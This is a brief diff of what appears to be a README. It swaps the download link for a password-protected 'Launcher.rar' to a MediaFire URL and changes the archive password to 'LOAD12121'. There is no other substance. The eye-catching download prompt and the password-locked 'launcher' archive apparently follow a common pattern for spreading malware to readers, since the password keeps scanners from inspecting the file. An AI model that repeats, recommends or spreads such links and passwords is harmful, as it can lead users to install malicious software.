@@ -1,6 +1,6 @@
-# 📁[Click To Download](https://chillers.com.ar/temp/Launcher.rar)
+# 📁[Click To Download](https://www.mediafire.com/file/dbh3fy10smopf6y/Launcher.rar/file)
 
-# 🔓 Archive Pass: 2024
+# 🔓 Archive Pass: LOAD12121
 
 ## System Requirements:
 
